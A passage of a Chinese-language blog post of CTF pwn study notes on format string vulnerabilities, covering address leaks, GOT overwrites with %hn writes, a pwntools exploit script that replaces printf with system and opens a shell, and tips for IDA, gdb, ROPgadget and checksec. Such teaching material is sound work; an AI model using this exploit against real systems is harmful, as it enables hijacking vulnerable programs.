<h2 id="格式化字符串-format-string"><a href="#格式化字符串-format-string" class="headerlink" title="格式化字符串(format string)"></a>格式化字符串(format string)</h2><p><code>printf(&quot;%p%p&quot;)</code>遇到%会默认有后续参数，然后拿到值进行输出，并不会检查参数个数</p>
<p>64位情况下 格式化字符串本身是rdi，第一个%会输出rsi 后续是rdx rcx r8 r9</p>
<p>第六个%开始会输出栈上的数据</p>
<ul>
<li><p>%p 输出8字节的数据</p>
</li>
<li><p>%s 把数据作为字符串的首地址 输出此地址对应的字符串(\0截断) 可用于泄露任意地址</p>
</li>
<li><p>%n 把已经输出的字节个数写入此数据对应的地址中 可用于修改任意地址</p>
</li>
<li><p>%k$p 输出第k个位置的数据</p>
</li>
<li><p>%kc 输出k bytes的字符</p>
</li>
</ul>
<h3 id="泄露地址"><a href="#泄露地址" class="headerlink" title="泄露地址"></a>泄露地址</h3><p>找到格式化字符串本身在栈上的位置，可用<code>AAAAAAAAAAAAA%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code>查看哪个位置出现0x41 假设为k</p>
<p><code>payload=&#39;addr&#39;+&#39;%k$s&#39;</code> 可用输出addr</p>
<p>但由于地址为小端 且64位有8bytes地址 会被\0截断 所以需要把地址放后面</p>
<p><code>payload = &#39;%k+1$s&#39;+pad+&#39;addr&#39;</code> 前面凑8bytes  addr右移一位(8bytes)</p>
<h3 id="修改地址"><a href="#修改地址" class="headerlink" title="修改地址"></a>修改地址</h3><p><code>payload = &#39;%&#123;x&#125;c%&#123;k&#125;$n&#39;+ pad + addr</code> 把addr放到第k个位置 先用<code>%&#123;x&#125;c</code>输出x个字符 然后数值x会写入地址addr中</p>
<ul>
<li>n 4bytes</li>
<li>hn 2bytes</li>
<li>hhn 1byte</li>
</ul>
<p>例如修改printf的got表（0x601028）中存储的地址为system地址（0x7f9940d4f3a0）</p>
<p>可以一次写入2bytes 注意是小端</p>
<p>0x601028 地址存入0xf3a0</p>
<p>0x60102a 地址存入0x40d4</p>
<p>0x60102c 地址存入0x7f99</p>
<p>一次写1byte 会导致payload太长 可能破坏了栈</p>
<p>一次写4byte 会导致输出的字符输太多 太慢</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">printf_got = elf.got[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">payload = <span class="string">&#x27;%7$sAAAA&#x27;</span>.encode() + p64(printf_got)</span><br><span class="line">p.recvuntil(<span class="string">&#x27;Format String\n&#x27;</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">recv = p.recv()</span><br><span class="line">printf_addr = u64(recv[:<span class="number">6</span>]+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">2</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">libc_base = printf_addr - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">sys_addr = libc_base + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">sys_addr_array = <span class="built_in">bytearray</span>.fromhex(<span class="built_in">hex</span>(sys_addr)[<span class="number">2</span>:])</span><br><span class="line">c = [<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">0</span>,-<span class="number">1</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        c[j] *= <span class="number">256</span></span><br><span class="line">        c[j] += sys_addr_array[-i-j*<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">k = <span class="number">12</span></span><br><span class="line">block = <span class="number">16</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">f1 =  <span class="string">f&#x27;%<span class="subst">&#123;c[<span class="number">0</span>]&#125;</span>c%<span class="subst">&#123;k&#125;</span>$hn&#x27;</span></span><br><span class="line">pad = block-<span class="built_in">len</span>(f1)</span><br><span class="line">payload += f1 + <span class="string">&#x27;A&#x27;</span> * pad </span><br><span class="line"><span class="built_in">print</span>(c[<span class="number">0</span>])</span><br><span class="line">acc = c[<span class="number">0</span>] + pad </span><br><span class="line">c[<span class="number">1</span>] -= acc</span><br><span class="line"><span class="keyword">while</span> c[<span class="number">1</span>] &lt; <span class="number">0</span>:</span><br><span class="line">    c[<span class="number">1</span>] += <span class="number">2</span>**<span class="number">16</span></span><br><span class="line">f2 =  <span class="string">f&#x27;%<span class="subst">&#123;c[<span class="number">1</span>]&#125;</span>c%<span class="subst">&#123;k+<span class="number">1</span>&#125;</span>$hn&#x27;</span></span><br><span class="line">pad = block-<span class="built_in">len</span>(f2)</span><br><span class="line">payload += f2 + <span class="string">&#x27;A&#x27;</span> * pad </span><br><span class="line"><span class="built_in">print</span>(acc+c[<span class="number">1</span>])</span><br><span class="line">acc += c[<span class="number">1</span>] + pad </span><br><span class="line">c[<span class="number">2</span>] -= acc</span><br><span class="line"><span class="keyword">while</span> c[<span class="number">2</span>] &lt; <span class="number">0</span>:</span><br><span class="line">    c[<span class="number">2</span>] += <span class="number">2</span>**<span class="number">16</span></span><br><span class="line">f3 =  <span class="string">f&#x27;%<span class="subst">&#123;c[<span class="number">2</span>]&#125;</span>c%<span class="subst">&#123;k+<span class="number">2</span>&#125;</span>$hn&#x27;</span></span><br><span class="line">pad = block-<span class="built_in">len</span>(f3)</span><br><span class="line">payload += f3 + <span class="string">&#x27;A&#x27;</span> * pad</span><br><span class="line"><span class="built_in">print</span>(acc+c[<span class="number">2</span>])</span><br><span class="line"></span><br><span class="line">payload = payload.encode()</span><br><span class="line">payload += p64(printf_got)</span><br><span class="line">payload += p64(printf_got+<span class="number">2</span>)</span><br><span class="line">payload += p64(printf_got+<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line">&lt;/code&gt;</span><br></pre></td></tr></table></figure>



<h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><h3 id="ida"><a href="#ida" class="headerlink" title="ida"></a>ida</h3><ul>
<li>F5 看C语言  空格 看汇编</li>
<li>shift+F12 看字符串</li>
<li>右键可以找到引用地址  重命名等</li>
<li>展示的汇编是intel语法 AT&amp;T可以通过<code>objdump -d xx &gt;&gt; xx.txt</code>查看</li>
</ul>
<h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><ul>
<li>remote 远程 process本地</li>
<li>ELF 加载.so</li>
<li>gdb.attach 本地调试</li>
<li>sendline,recv,recvuntil</li>
<li>p64,u64</li>
</ul>
<h3 id="pwngdb"><a href="#pwngdb" class="headerlink" title="pwngdb"></a>pwngdb</h3><ul>
<li>run运行到断点或结束  start从第一行开始运行</li>
<li>x 地址或$寄存器  看数据 &#x2F;g 8bytes &#x2F;s字符串</li>
<li>info reg 看寄存器</li>
<li>b *地址&#x2F;label 断点  c继续 si单步 n不进入函数 finish跳出函数</li>
<li>got 看got表 vmmap看内存地址分布</li>
</ul>
<h3 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h3><p><code>ROPgadget --binary xxx</code></p>
<ul>
<li>–string</li>
<li>grep</li>
</ul>
<h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><code>checksec xxx</code></p>
<h2 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h2><ul>
<li>recvuntil 最后加不加\n</li>
<li>sendline与send不同 导致重复</li>
</ul>

    </div>

    
    
    

    <footer class="post-footer">

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2024/01/22/chcore/IPC/" rel="prev" title="IPC">
                  <i class="fa fa-angle-left"></i> IPC
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2024/01/22/ctf/sc/" rel="next" title="TreasureHunter">
                  TreasureHunter <i class="fa fa-angle-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
</div>






</div>
  </main>

  <footer class="footer">
    <div class="footer-inner">

  <div class="copyright">
    &copy; 
    <span itemprop="copyrightYear">2025</span>
    <span class="with-love">
      <i class="fa fa-heart"></i>
    </span>
    <span class="author" itemprop="copyrightHolder">szy</span>
  </div>
<div class="wordcount">
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-line"></i>
    </span>
    <span title="Word count total">208k</span>
  </span>
  <span class="post-meta-item">
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">12:37</span>
  </span>
</div>
<div class="busuanzi-count">
    <span class="post-meta-item" id="busuanzi_container_site_uv">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-item" id="busuanzi_container_site_pv">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

    </div>
  </footer>

  
  <div class="back-to-top" role="button" aria-label="Back to top">
    <i class="fa fa-arrow-up fa-lg"></i>
    <span>0%</span>
  </div>

<noscript>
  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
</noscript>


  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
<script src="/js/third-party/search/local-search.js"></script>







  
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>





</body>
</html>
